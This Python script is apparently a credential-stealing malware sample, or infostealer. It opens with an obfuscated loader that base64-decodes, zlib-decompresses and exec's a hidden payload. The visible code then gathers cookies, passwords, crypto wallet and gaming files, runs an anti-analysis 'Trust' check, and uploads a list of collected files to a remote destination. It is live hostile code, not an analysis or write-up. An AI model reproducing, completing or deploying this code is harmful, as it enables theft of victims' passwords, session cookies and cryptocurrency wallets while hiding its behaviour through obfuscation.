_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))

CookiCount, PasswCount = 0, 0
cookiWords = []
paswWords = []

WalletsZip = [] # [Name, Link]
GamingZip = []
OtherZip = []

GatherAll()
DETECTED = Trust(Cookies)
# DETECTED = False
if not DETECTED:
    wikith = Kiwi()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)
